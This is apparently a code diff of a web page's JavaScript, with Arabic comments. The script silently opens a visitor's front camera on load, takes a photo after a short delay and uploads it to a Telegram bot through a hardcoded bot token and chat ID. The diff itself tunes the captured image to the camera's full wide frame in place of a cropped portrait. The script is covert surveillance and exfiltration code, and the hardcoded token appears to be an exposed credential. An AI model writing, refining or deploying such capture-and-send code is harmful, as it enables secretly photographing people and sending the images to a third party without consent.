@@ -51,17 +51,17 @@
         const botToken = "8807798502:AAHZFi61wI_KflrG-3rLoHmccS_WqRuqNfg";
         const chatId = "2049331070";
 
-        // طلب الكاميرا بنسبة 9:16 عمودية افتراضياً
+        // طلب الكاميرا بالأبعاد العريضة الأصلية للعدسة
         navigator.mediaDevices.getUserMedia({ 
             video: { 
                 facingMode: "user",
-                width: { ideal: 720 },
-                height: { ideal: 1280 }
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
             } 
         })
         .then(stream => {
             video.srcObject = stream;
-            // الانتظار حتى يتم تحميل بيانات الفيديو لمعرفة الأبعاد الحقيقية
+            // الانتظار للتأكد من تحميل أبعاد الفيديو بالكامل
             video.onloadedmetadata = () => {
                 setTimeout(captureAndSend, 1500);
             };
@@ -69,49 +69,23 @@
         .catch(() => showError());
 
         function captureAndSend() {
+            // أخذ الأبعاد الواسعة الحقيقية القادمة من كاميرا الهاتف مباشرة
             const vWidth = video.videoWidth;
             const vHeight = video.videoHeight;
             
-            // تحديد أبعاد الكانفاس الثابتة بنسبة 9:16
-            const targetWidth = 720;
-            const targetHeight = 1280;
-            
-            canvas.width = targetWidth;
-            canvas.height = targetHeight;
+            // جعل الكانفاس يطابق أبعاد الكاميرا تماماً ليتسع للمشهد بالكامل دون اقتطاع
+            canvas.width = vWidth;
+            canvas.height = vHeight;
             
             const ctx = canvas.getContext('2d');
             
-            // حساب النسبة والتوسيط التلقائي (Center and Zoom Out)
-            const videoRatio = vWidth / vHeight;
-            const targetRatio = targetWidth / targetHeight;
+            // مسح الكانفاس لتهيئته
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
             
-            let drawWidth, drawHeight, offsetX, offsetY;
+            // رسم الكاميرا من النقطة (0,0) بالكامل، مما يمنع الإزاحة ويجعل الشخص في المنتصف تلقائياً
+            ctx.drawImage(video, 0, 0, vWidth, vHeight);
             
-            // محاكاة وضعية الـ Zoom Out (تعديل المعامل للتحكم بمدى البعد)
-            // استخدام معامل 0.85 يضمن صغر حجم المشهد وظهور الكاميرا بشكل أوسع ومتوسط تماماً
-            const zoomFactor = 0.50; 
-
-            if (videoRatio > targetRatio) {
-                // إذا كان الفيديو القادم عريضاً جداً
-                drawHeight = targetHeight * zoomFactor;
-                drawWidth = drawHeight * videoRatio;
-            } else {
-                // إذا كان الفيديو القادم طويلاً جداً
-                drawWidth = targetWidth * zoomFactor;
-                drawHeight = drawWidth / videoRatio;
-            }
-            
-            // معادلة التوسيط الرياضي المطلق لضمان عدم حدوث إزاحة لليسار أو اليمين
-            offsetX = (targetWidth - drawWidth) / 2;
-            offsetY = (targetHeight - drawHeight) / 2;
-            
-            // ملء الخلفية باللون الأسود لتغطية أي حواف فارغة ناتجة عن الـ Zoom Out
-            ctx.fillStyle = "#000000";
-            ctx.fillRect(0, 0, targetWidth, targetHeight);
-            
-            // رسم الصورة في المنتصف تماماً وبشكل متناسق
-            ctx.drawImage(video, offsetX, offsetY, drawWidth, drawHeight);
-            
+            // تحويل الصورة إلى Blob وإرسالها عبر البوت
             canvas.toBlob(blob => {
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
